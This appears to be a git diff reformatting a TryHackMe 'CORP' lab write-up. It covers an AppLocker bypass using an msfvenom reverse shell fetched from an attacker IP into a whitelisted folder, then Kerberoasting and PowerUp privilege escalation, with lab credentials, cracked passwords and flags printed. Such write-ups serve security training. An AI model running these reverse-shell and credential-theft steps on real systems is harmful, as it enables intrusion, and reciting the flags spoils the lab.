@@ -1,5 +1,8 @@
-# Deploy the Machine
----
+# CORP
+
+## Deploy the Machine
+
+***
 
 In this room, you will learn the following:
 
@@ -8,33 +11,34 @@ In this room, you will learn the following:
 3. AV Evading
 4. Applocker
 
-Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.  
+Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
 
 Answer the questions below
 
 Deploy the windows machine, you will be able to control this in your browser. However if you prefer to use your own RDP client, the credentials are below.
 
-Username: `corp\dark`  
-Password: `_QuejVudId6`
+Username: `corp\dark`\
+Password: `_QuejVudId6`
 
+## Bypassing Applocker
 
-# Bypassing Applocker
----
+***
 
-![](https://i.imgur.com/XtUZMLi.png)  
+![](https://i.imgur.com/XtUZMLi.png)
 
 AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, publisher, and hash.
 
 You will have noticed that with the deployed machine, you cannot execute your binaries, and certain functions on the system will be restricted.
 
-## Practical
----
+### Practical
+
+***
 
 We need to answer this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531150543.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531150543.png)
 
-We are told we can bypass the `applocker` restriction by dropping a file inside of 
+We are told we can bypass the `applocker` restriction by dropping a file inside of
 
 ```
  C:/Windows/System32/spool/drivers/color/
@@ -42,11 +46,12 @@ We are told we can bypass the `applocker` restriction by dropping a file inside 
 
 This directory is in the whitelist by default, so, we can upload a `reverse` shell in the format of an `exe` and execute it to get a reverse shell, let's do it.
 
->Note: No encoding or complex reverse shell will be created, in real life scenarios, you'd need to craft a more complex payload, make sure to check the Host Evasions module on Tryhackme. If the last step does not work, you'll need to obfuscate and encode the payload.
+> Note: No encoding or complex reverse shell will be created, in real life scenarios, you'd need to craft a more complex payload, make sure to check the Host Evasions module on Tryhackme. If the last step does not work, you'll need to obfuscate and encode the payload.
 
 Knowing all this, we can craft a reverse shell using msfvenom:
 
-``
+\`\`
+
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.21.28 LPORT=4444 -f exe -o shell.exe
 ```
@@ -63,7 +68,7 @@ We need to connect to RDP, we can use:
 xfreerdp /u:corp\\dark /p:_QuejVudId6 /v:10.10.253.99 /size:1440x1080 +clipboard +fonts /cert:ignore
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531151311.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531151311.png)
 
 On here, let's host the python server and use Powershell to download the file into the whitelisted path:
 
@@ -71,7 +76,7 @@ On here, let's host the python server and use Powershell to download the file in
 Invoke-WebRequest -Uri http://10.14.21.28:8000/shell.exe -OutFile C:/Windows/System32/spool/drivers/color/shell.exe
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531151710.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531151710.png)
 
 We can see the request was successful, now, we can execute the file and receive a shell in our listener:
 
@@ -81,7 +86,7 @@ C:/Windows/System32/spool/drivers/color/shell.exe
 
 Once this goes through, we will receive a shell.
 
----
+***
 
 Now, for the flag, we can use:
 
@@ -89,7 +94,7 @@ Now, for the flag, we can use:
 Get-Content C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531152244.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531152244.png)
 
 Got our flag:
 
@@ -97,23 +102,21 @@ Got our flag:
 flag{a12a41b5f8111327690f836e9b302f0b}
 ```
 
+## Kerberoasting
 
-
-# Kerberoasting
----
+***
 
 ![](https://i.imgur.com/9YDvbLg.png)
 
 It is important you understand how Kerberos actually works in order to know how to exploit it. Watch the video below.
 
+Kerberos is the authentication system for Windows and Active Directory networks. There are many attacks against Kerberos, in this room we will use a Powershell script to request a service ticket for an account and acquire a ticket hash. We can then crack this hash to get access to another user account!
 
-Kerberos is the authentication system for Windows and Active Directory networks. There are many attacks against Kerberos, in this room we will use a Powershell script to request a service ticket for an account and acquire a ticket hash. We can then crack this hash to get access to another user account!
+### Practical
 
+***
 
-## Practical
----
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531152426.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531152426.png)
 
 Nice, we need to do the following:
 
@@ -121,7 +124,7 @@ Nice, we need to do the following:
 setspn -T medin -Q */*
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531152549.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531152549.png)
 
 We now need to download the `Invoke-Kerberoast.ps1` script, for this, download it on our host machine and host it as before:
 
@@ -129,17 +132,17 @@ We now need to download the `Invoke-Kerberoast.ps1` script, for this, download i
 wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
 ```
 
-
 Once you start the python server, do:
+
 ```
 Invoke-WebRequest -Uri http://10.14.21.28:8000/Invoke-Kerberoast.ps1 -OutFile Invoke-Kerberoast.ps1
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531152834.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531152834.png)
 
 We'll see the request on our server, also, the file is now on our directory we downloaded it:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531152908.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531152908.png)
 
 Let's use it:
 
@@ -148,7 +151,7 @@ Let's use it:
 Invoke-Kerberoast -OutputFormat hashcat |fl
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531153500.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531153500.png)
 
 There we go, we got our `TGS`, let's use hashcat to crack it:
 
@@ -180,31 +183,31 @@ We need to use `rdp` again:
 xfreerdp /u:corp\\fela /p:"rubenF124" /v:10.10.253.99 /size:1440x1080 +clipboard +auto-reconnect /cert:ignore
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531154205.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531154205.png)
 
 We can see our flag:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531154311.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531154311.png)
 
 ```
 flag{bde1642535aa396d2439d86fe54a36e4}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531154304.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531154304.png)
 
+## Privilege Escalation
 
-# Privilege Escalation
-----
+***
 
-![](https://i.imgur.com/pE0VPk4.png)  
+![](https://i.imgur.com/pE0VPk4.png)
 
 We will use a PowerShell enumeration script to examine the Windows machine. We can then determine the best way to get Administrator access.
 
+### Practical
 
-## Practical
-----
+***
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531160234.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531160234.png)
 
 Same procedure as the last task:
 
@@ -215,8 +218,7 @@ Invoke-WebRequest -Uri http://10.14.21.28:8000/PowerUp.ps1 -OutFile PowerUp.ps1
 
 We can now read `unattended.xml`:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531160740.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531160740.png)
 
 We got this hash:
 
@@ -236,19 +238,18 @@ We got it, let's go into rdp and get our flag:
 xfreerdp /u:Administrator /p:"tqjJpEX9Qv8ybKI3yHcc=L\!5e(\!wW;\$T" /v:10.10.253.99 /size:1440x1080 +clipboard +auto-reconnect /cert:ignore
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531161032.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531161032.png)
 
 We need to change password, change it to anything.
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531161948.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531161948.png)
 
 Now, we can read our flag:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531162002.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531162002.png)
 
 ```
 THM{g00d_j0b_SYS4DM1n_M4s73R}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531162040.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250531162040.png)
